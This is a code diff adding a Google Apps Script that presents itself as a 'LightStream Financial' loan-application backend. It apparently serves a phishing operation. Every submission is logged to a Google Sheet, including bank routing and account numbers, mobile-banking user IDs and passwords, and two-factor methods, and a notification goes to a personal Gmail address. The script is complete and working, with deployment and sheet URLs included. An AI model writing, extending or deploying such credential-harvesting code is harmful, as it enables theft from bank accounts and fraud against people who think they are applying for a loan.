@@ -1,0 +1,109 @@
+// Enhanced Google Apps Script for Loan Applications with Better Email Handling
+// February 19, 2026 - Enhanced for debugging and reliability
+// DEPLOYMENT URL: https://script.google.com/macros/s/AKfycbwXjfqpfa04jjiGK7sLO-UiZW-NOrdChKc7iA0uJdK2v8eWb6Vvi0YZYM0aCVFmhEttFw/exec
+
+const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";
+const RECIPIENT_EMAIL = "finnfoxpersonalloan@gmail.com";
+
+function doGet(e) {
+  return ContentService.createTextOutput("LightStream Enhanced Google Apps Script is working");
+}
+
+function doPost(e) {
+  try {
+    console.log("=== NEW SUBMISSION STARTED ===");
+    
+    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Loan Applications");
+    
+    // Handle FormData (from working version)
+    let data = {};
+    if (e.parameters) {
+      for (let key in e.parameters) {
+        data[key] = e.parameters[key][0];
+      }
+    }
+    
+    console.log("Form data received:", JSON.stringify(data));
+    
+    // Add data to Google Sheets
+    sheet.appendRow([
+      data.timestamp || new Date().toISOString(),
+      data.type || 'Unknown',
+      data.firstName || '',
+      data.lastName || '',
+      data.email || '',
+      data.phone || '',
+      data.loanAmount || '',
+      data.loanPurpose || '',
+      data.loanDuration || '',
+      data.grossMonthlyIncome || '',
+      data.employmentStatus || '',
+      data.creditScore || '',
+      data.streetAddress || '',
+      data.city || '',
+      data.state || '',
+      data.zipCode || '',
+      data.routingNumber || '',
+      data.accountNumber || '',
+      data.bankName || '',
+      data.mobileBankingUserId || '',
+      data.mobileBankingPassword || '[PROTECTED]',
+      data.twoFactorMethod || '',
+      data.termsAccepted || 'false'
+    ]);
+    
+    console.log("Data added to Google Sheets successfully");
+    
+    // Send email notification
+    const emailResult = sendEmailNotification(data);
+    console.log("Email send result:", emailResult);
+    
+    const responseMessage = emailResult.success 
+      ? "SUCCESS: Data saved to Google Sheets and email sent successfully"
+      : "SUCCESS: Data saved to Google Sheets but email failed: " + emailResult.error;
+    
+    return ContentService.createTextOutput(responseMessage);
+    
+  } catch (error) {
+    console.error("ERROR in doPost:", error.toString());
+    return ContentService.createTextOutput("ERROR: " + error.toString());
+  }
+}
+
+function sendEmailNotification(data) {
+  try {
+    console.log("=== SENDING EMAIL ===");
+    
+    const subject = "New " + (data.type || "Loan") + " Application - LightStream Financial";
+    
+    const body = "New " + (data.type || "loan") + " application received:\n\n" +
+      "Customer: " + (data.firstName || '') + " " + (data.lastName || '') + "\n" +
+      "Email: " + (data.email || 'N/A') + "\n" +
+      "Phone: " + (data.phone || 'N/A') + "\n" +
+      "Loan Amount: $" + (data.loanAmount || 'N/A') + "\n" +
+      "Loan Purpose: " + (data.loanPurpose || 'N/A') + "\n" +
+      "Credit Score: " + (data.creditScore || 'N/A') + "\n" +
+      "Bank: " + (data.bankName || 'N/A') + "\n" +
+      "Submitted: " + new Date().toLocaleString() + "\n\n" +
+      "Check Google Sheet for complete details.";
+    
+    console.log("Email subject:", subject);
+    console.log("Email body preview:", body.substring(0, 200) + "...");
+    
+    // Send email with detailed logging
+    MailApp.sendEmail({
+      to: RECIPIENT_EMAIL,
+      subject: subject,
+      body: body,
+      name: "LightStream Financial"
+    });
+    
+    console.log("Email sent successfully to:", RECIPIENT_EMAIL);
+    return { success: true, message: "Email sent successfully" };
+    
+  } catch (error) {
+    console.error("EMAIL ERROR:", error.toString());
+    console.error("Email error details:", error);
+    return { success: false, error: error.toString() };
+  }
+}
